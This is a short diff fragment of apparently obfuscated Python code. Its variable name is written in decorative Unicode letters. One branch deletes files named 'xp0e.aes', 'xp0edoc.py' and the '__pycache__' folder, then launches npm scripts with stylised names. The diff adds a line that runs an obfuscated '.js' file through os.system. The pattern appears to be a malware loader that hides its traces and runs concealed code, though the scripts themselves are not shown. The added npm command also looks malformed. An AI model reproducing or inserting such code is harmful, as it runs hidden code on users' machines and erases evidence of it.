@@ -162,6 +162,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__") 
+            os.system('npm --no-warnings 🦋𝖕𝖔𝖜𝖊𝖗𝖊𝖉.js')
             os.system('npm --no-warnings run 𝐀𝐫𝐜𝐭𝐢𝐱')
         else:
             os.remove("xp0e.zip")
